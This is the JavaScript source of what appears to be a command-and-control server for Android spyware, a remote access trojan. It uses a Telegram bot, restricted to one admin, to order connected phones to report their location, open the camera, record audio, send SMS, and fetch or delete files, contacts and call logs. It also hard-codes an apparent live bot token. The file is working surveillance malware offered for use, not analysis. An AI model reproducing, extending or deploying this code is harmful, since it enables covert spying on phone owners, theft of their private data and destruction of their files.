const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let connectedDevices = [];
let clients = [];

const bot = new TelegramBot('8016555931:AAHhGXMJwmObT0CK9k5FRhNCCPnfMhes_1Y', { polling: true });
const ADMIN_ID = 6969597735;

wss.on('connection', function connection(ws) {
  console.log('📡 جهاز متصل');
  ws.on('message', function incoming(message) {
    try {
      const data = JSON.parse(message);
      connectedDevices.push({
        id: data.deviceId,
        model: data.model,
        battery: data.battery,
        sdk: data.sdk,
        sim: data.sim,
        brightness: data.brightness
      });
      clients.push(ws);
    } catch (e) {
      console.log('❌ خطأ:', e);
    }
  });
  ws.on('close', () => console.log('❌ جهاز فصل الاتصال'));
});

app.get('/', (req, res) => {
  res.send('✅ الخادم شغّال - حمودي');
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (chatId !== ADMIN_ID) return bot.sendMessage(chatId, '🚫 غير مسموح');

  if (text === '/start') return bot.sendMessage(chatId, '🔐 أهلاً بك في بوت حمودي');

  if (text === '/devices') {
    if (!connectedDevices.length) return bot.sendMessage(chatId, '❌ لا يوجد أجهزة');
    let info = '📱 الأجهزة:\n';
    connectedDevices.forEach((d, i) => {
      info += `#${i + 1} - ${d.model} 🔋${d.battery}% (SDK ${d.sdk})\n`;
    });
    return bot.sendMessage(chatId, info);
  }

  const [cmd, indexStr, ...rest] = text.split(' ');
  const index = parseInt(indexStr) - 1;
  const client = clients[index];
  if (!client) return;

  const sendCommand = (payload, confirmation) => {
    client.send(JSON.stringify(payload));
    bot.sendMessage(chatId, confirmation);
  };

  if (cmd === '/loc') sendCommand({ type: 'request_location' }, '📍 طلب الموقع');
  if (cmd === '/cam') {
    const camType = rest[0] === '1' ? 'selfie' : 'main';
    sendCommand({ type: 'camera', mode: camType }, `📸 فتح الكاميرا ${camType}`);
  }
  if (cmd === '/mic') sendCommand({ type: 'record_audio' }, '🎤 تسجيل صوتي');
  if (cmd === '/delfile') sendCommand({ type: 'delete_file', filename: rest.join(' ') }, '🗑️ حذف ملف');
  if (cmd === '/getfile') sendCommand({ type: 'get_file', filename: rest.join(' ') }, '📂 طلب ملف');
  if (cmd === '/notify') sendCommand({ type: 'notify', message: rest.join(' ') }, '🔔 تم إرسال الإشعار');
  if (cmd === '/sendmsg') sendCommand({ type: 'sms', message: rest.join(' ') }, '📩 تم إرسال رسالة SMS');
  if (cmd === '/mute') sendCommand({ type: 'mute' }, '🔇 تم كتم الصوت');
  if (cmd === '/unmute') sendCommand({ type: 'unmute' }, '🔊 تم تشغيل الصوت');
  if (cmd === '/contacts') sendCommand({ type: 'get_contacts' }, '📁 طلب جهات الاتصال');
  if (cmd === '/calls') sendCommand({ type: 'get_calls' }, '📞 طلب سجل المكالمات');
});

server.listen(6144, () => {
  console.log('🚀 الخادم يعمل على المنفذ 6144');
});
